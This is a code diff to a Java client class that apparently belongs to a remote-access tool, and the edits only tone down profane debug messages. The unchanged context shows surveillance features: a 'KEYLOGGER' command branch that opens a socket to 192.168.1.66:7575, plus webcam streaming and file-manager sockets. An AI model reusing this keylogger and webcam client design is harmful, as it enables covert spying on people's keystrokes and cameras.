@@ -38,7 +38,7 @@ public class JClient{
 					@Override public void uncaughtException(Thread t, Throwable e) {
 //						System.out.println(t.getName() + "; " + e);
 						if(e instanceof ArithmeticException) {
-							System.out.println("fUCK YOU!");
+							System.out.println("commenting it!");
 							run();
 						} else {
 							System.out.println(t.getName() + "; " + e);
@@ -86,7 +86,7 @@ public class JClient{
 					
 					
 					//SEND THE INFO RIGHT HERE! :o
-					System.out.println("shit's not working!");
+					System.out.println(" not working!");
 //					PrintWriter temp = new PrintWriter(mainSocket.getOutputStream());
 //					BufferedReader rofl = new BufferedReader(new InputStreamReader(mainSocket.getInputStream()));
 //					temp.print("Justin Bieber");
@@ -151,7 +151,7 @@ public class JClient{
 
 //					temp.println("end");
 					
-					System.out.println("BITCH!");
+					System.out.println("BOBBBAFETT!");
 					
 				    //create new thread ClientConnectionChecker that checks continuously
 					new Thread(new ClientConnectionChecker(mainSocket)).start();
@@ -214,7 +214,7 @@ public class JClient{
 //					System.out.println(YOU SOUL WHAT'S READ: " + temp[0]);
 //						System.out.println("Command is: " + command);
 					if(temp[0] == (byte)5) { //KEYLOGGER :o
-						System.out.println("FUCK MAN I'M IN HERE!");
+						System.out.println("MAN I'M IN HERE!");
 						while (true) {
 							try {
 								Socket keylogger = new Socket("192.168.1.66",7575);
@@ -252,7 +252,7 @@ public class JClient{
 									writeStringOutStream(webcamFrameRate.getOutputStream(), "webcamFrameRate");
 									new WebcamFrameDelayDetector(webcamFrameRate.getInputStream(), webcam);
 //									new ClientFileManager(fileManagerCommandSocket, fileManagerDataSocket);
-									System.out.println("SUCK THE SON !");
+									System.out.println("SOOTHE THE SON !");
 									break outerloop;
 								} catch(Exception e) {
 									
